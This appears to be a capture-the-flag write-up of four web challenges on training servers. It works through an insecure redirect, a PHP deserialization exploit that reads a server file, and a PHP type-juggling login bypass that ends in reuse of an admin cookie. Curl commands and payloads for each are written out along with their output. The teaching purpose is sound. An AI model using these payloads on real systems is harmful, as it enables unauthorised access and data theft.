# Web
[SuperHeros](#superheros---2pts)<br>
[Bravo](#bravo---8pts)<br>
[Cerealize](#cerealize---15pts)<br>
[Juggling Fan Club](#juggling-fan-club---20pts)<br>

## SuperHeros - 2pts
> In the following public API "/v1/public/characters" on developer.marvel.com, what is the woman's name associated with id: 1012717?
> 
> Author: WSC


Looking into marvels API documentation it seems like I need an API key for all requests, so in order to complete the challenge I'll create a throw away account.

![Marvel's Developer Account Portal](https://i.imgur.com/vwZxSDX.png)

I found that Marvel provides one of those interactive API documentation pages for developers. We can easily go there since we don't need additional parameters such as private API keys or hashes:

![API Tester](https://i.imgur.com/duOH3uM.png)

Simply paste in our id and there we go:

![API Tester](https://i.imgur.com/NaMbRI3.png)

We get our flag:
```
Agatha Harkness
```

## Bravo - 8pts
> Perhaps we can direct your attention over here . . .
> 
> Flag is of the form "flag{}"
> Created by US Cyber Range
> 
> http://bravo.virginiacyberrange.net


Going to the site we are redirected to `/login.php` and are greeted with a login page:

![Site](https://i.imgur.com/qEzuwJN.png)

Looking into any client code:

![Site](https://i.imgur.com/iZZyzkD.png)

Hm, maybe we should head to index.php? (or by default the regular domain)

But every time we do, we're redirected to `/login.php`, lets try using curl to get the contents of the index:

```
┌──(kali㉿kali)-[~]
└─$ curl -i bravo.virginiacyberrange.net/
HTTP/1.1 302 Found
Date: Sat, 09 Jul 2022 07:51:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 249
Connection: keep-alive
Server: Apache/2.4.29 (Unix)
X-Powered-By: PHP/7.1.14
Location: login.php

Go to 3a5f1b52344f42ccd459c8aa13487591.php

```

Looks like we got something, let's continue by following it:

```
┌──(kali㉿kali)-[~]
└─$ curl -i bravo.virginiacyberrange.net/3a5f1b52344f42ccd459c8aa13487591.php
HTTP/1.1 302 Found
Date: Sat, 09 Jul 2022 07:51:45 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 83
Connection: keep-alive
Server: Apache/2.4.29 (Unix)
X-Powered-By: PHP/7.1.14
Location: login.php

<html>

<h3>Good job. Your flag is: flag{1ns3cure_r3d1r3cts_4r3_b4d}</h3>

</html>
```

And we got the flag!
```
flag{1ns3cure_r3d1r3cts_4r3_b4d}
```

## Cerealize - 15pts
> We started a project to archive every type of cereal ever created! We’re so confident our archive is secure, we’re even open-sourcing it!
> 
> Flag is of the form "flag{}"
> 
> Created by US Cyber Range
> 
> https://cerealize.challenges.virginiacyberrange.net/ <br>
> [source.tar.gz]()

Looking into the php code, we can see a file called `archive_reader.php`:
```php
<?php
// all the secret proprietary cereals we signed NDAs to try are stored in a file
// at /var/www/secret_archive.txt -- be sure to keep those hidden when we open-source our project!
class secret_cereal_archive{
	public function __tostring(){
		return file_get_contents($this->filename);
	}
}
?>
```

So looks like we need to target this `secret_cereal_archive` class to find what is in `/var/www/secret_archive.txt`.

Looking into the main submission page, we see this php code:
```php
<?php
include 'archive_reader.php';

class cereal{
	public $cereal_name;
	public $cereal_flavor;
	public $cereal_brand;

	public function submission_result(){
		echo "Thanks for submitting a new cereal for our archive!";
	}
	public function display_submission(){
		echo "You told us about" . $this->cereal_name . "; we'll see if it's in our archive! If not, we'll add it.";
	}
}

$cereal_submission = unserialize($_POST['cereal']);
if ($cereal_submission){
	$cereal_submission->submission_result();
	if($cereal_submission->cereal_name && $cereal_submission->cereal_flavor && $cereal_submission->cereal_brand){
		$cereal_submission->display_submission();
	}
}
else{
	echo "Sorry, something's wrong with your cereal submission. Please try again.";
}
?>
```

The page tells us:
> Since we're still in development, we don't have a fancy frontend for submitting a new cereal for the archive. Instead, just give us a POST request with a "cereal" parameter. Just for fun, why don't you serialize it? We've open-sourced the project, so you can see what format we're expecting by checking out the code.

Note how they said that you should serialize the cereal entry. This can also be confirmed with the code above. To start we need to figure out what to send in the first place. We'll make a class object and serialize it:
```php
$class = new cereal();
$class->cereal_name = "blah";
$class->cereal_flavor = "blah";
$class->cereal_brand = "blah";
echo serialize($class);
```

This gives us:
```
O:6:"cereal":3:{s:11:"cereal_name";s:4:"FLAG";s:13:"cereal_flavor";s:4:"blah";s:12:"cereal_brand";s:4:"blah";}
```

Lets build our curl command:
```
curl -X POST https://cerealize.challenges.virginiacyberrange.net/cerealize.php -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";s:4:\"blah\";s:13:\"cereal_flavor\";s:4:\"blah\";s:12:\"cereal_brand\";s:4:\"blah\";}"'
```

- `curl`: cmd
- `-X`: type of request
- `POST`: specify type
- `https..`: website to send request to
- `-F`: specify the next input is form-data (since $_POST doesn't see request body data)
- `'cerea..`: the form data under the "cereal" parameter


We can verify this works if we run it:
```
┌──(kali㉿kali)-[~]
└─$ curl -X POST https://cerealize.challenges.virginiacyberrange.net/cerealize.php -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";s:4:\"blah\";s:13:\"cereal_flavor\";s:4:\"blah\";s:12:\"cereal_brand\";s:4:\"blah\";}"'
...

Thanks for submitting a new cereal for our archive!You told us aboutblah; we'll see if it's in our archive! If not, we'll add it.
</html>
```

Looks like that's good, now we know that the `cereal_name` parameter is being printed in:
```php
public function display_submission(){
	echo "You told us about" . $this->cereal_name . "; we'll see if it's in our archive! If not, we'll add it.";
}
```

This means we need to somehow call `(string) new secret_cereal_archive()`. Since we can serialize objects, why not make a `secret_cereal_archive` object?
```php
$exploit = new secret_cereal_archive();
$exploit->filename = "/var/www/secret_archive.txt";

$class = new cereal();
$class->cereal_name = $exploit;
$class->cereal_flavor = "FLAVOR";
$class->cereal_brand = "BRAND";
echo serialize($class)
```

We set the `filename` variable we saw in `secret_cereal_archive` and the location inside the comment. Basically we are redirecting `cereal_name` to `__tostring` inside `secret_cereal_archive`. Our serialized string:
```
O:6:"cereal":3:{s:11:"cereal_name";O:21:"secret_cereal_archive":1:{s:8:"filename";s:27:"/var/www/secret_archive.txt";}s:13:"cereal_flavor";s:6:"FLAVOR";s:12:"cereal_brand";s:5:"BRAND";}
```

Lets see if we get the flag:
```
┌──(kali㉿kali)-[~]
└─$ curl -X POST https://cerealize.challenges.virginiacyberrange.net/cerealize.php -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";O:21:\"secret_cereal_archive\":1:{s:8:\"filename\";s:27:\"/var/www/secret_archive.txt\";}s:13:\"cereal_flavor\";s:6:\"FLAVOR\";s:12:\"cereal_brand\";s:5:\"BRAND\";}"'
...

Thanks for submitting a new cereal for our archive!You told us aboutflag{d0nt_d3s3r1l1z3_us3r_1nput}
; we'll see if it's in our archive! If not, we'll add it.
</html>
```

And we got the flag:
Answer:
```
flag{d0nt_d3s3r1l1z3_us3r_1nput}
```

## Juggling Fan Club - 20pts
> I made a website dedicated to my favorite activity, juggling! I’m sure it’s super secure, but just to make sure, can you try to hack your way in and gain administrative access?
> 
> Flag is of the form "flag{}" <br>
> Created by US Cyber Range
> 
> http://juliet.virginiacyberrange.net/

Looking into the site, I found this comment on `/guide.html`:
```html
<!--
I'll add more content later. If you want to add to the guide, you already know where the admin page is. I didn't link to it anywhere, so it should be impossible for hackers to ever discover it, right?
-->
```

Looks like another apache project, lets try `/admin.php`:

![admin.php](https://i.imgur.com/omfZg7M.png)

We were correct. Looking into the page source we find another comment:
```html
<!--
I just hard-coded the creds and I'm comparing strings for now until I can figure out this whole SQL thing.
Don't worry, the password is really complicated. Nobody's going to guess it.
-->
```

Lets use the default username of `administrator`, now all we need to do is bypass the password. Judging from the theme of the challenge and comments, we'll need to do some type juggling with the php requests.

Following this [guide](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), you can see the flaws with PHP's loose comparisons:

![loose comparisons](https://i.imgur.com/6IPJbuF.png)

However, trying all of these, I couldn't get them to work. The main reason is that with this site, the request is a form-data request, meaning it stringifys all input. Meaning instead of doing the normal
```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://juliet.virginiacyberrange.net/admin.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=administrator&password=pass"
...
Wrong password.
```

We would replace `"Content-Type: application/x-www-form-urlencoded"` with `"Content-Type: application/json"` but as said before, we know that this form only accepts form-data or x-www-form-urlencoded requests. That rules out all integer/boolean/etc type juggling attacks. Which leaves us with arrays!

So when we send the request with the parameters `username=administrator&password=pass`, php sees:
```php
$_REQUEST["username"] = "administrator";
$_REQUEST["password"] = "pass";
```

But when we post `username=administrator&password[]=pass`, php sees:
```php
$_REQUEST["username"] = "administrator";
$_REQUEST["password"] = ["pass"];
```

And since in loose comparisons, a string is equal to an array, we can use the same trick to get the password to work.

We can send the same curl POST request except with the -v tag to get returned headers like cookies:
```
┌──(kali㉿kali)-[~]
└─$ curl -v -X POST http://juliet.virginiacyberrange.net/admin.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=administrator&password[]=pass"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 54.85.223.47:80...
* Connected to juliet.virginiacyberrange.net (54.85.223.47) port 80 (#0)
> POST /admin.php HTTP/1.1
> Host: juliet.virginiacyberrange.net
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 38
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Wed, 27 Jul 2022 04:17:40 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 1016
< Connection: keep-alive
< Server: Apache/2.4.29 (Ubuntu)
< Set-Cookie: admin_cookie=mlqAAAnjnufewo29838ncbZ; expires=Wed, 27-Jul-2022 05:17:40 GMT; Max-Age=3600
...
You've logged in successfully.
```

Success! We logged in successfully and we got a cookie called `admin_cookie` with the value of `mlqAAAnjnufewo29838ncbZ`. Now looking back to the login page, we see a "get the flag button", clicking that will redirect us to `http://juliet.virginiacyberrange.net/flag.php`.

So lets see if we can pass in that `admin_cookie` cookie with the GET request to `/flag.php`:
```
┌──(kali㉿kali)-[~]
└─$ curl http://juliet.virginiacyberrange.net/flag.php --cookie "admin_cookie=mlqAAAnjnufewo29838ncbZ"
<html>
<body style=background-color:#f44a41>
flag{r34l_pr0s_juggl3_typ3s}</body>
</html>
```

And we got the flag! Answer:
```
flag{r34l_pr0s_juggl3_typ3s}
```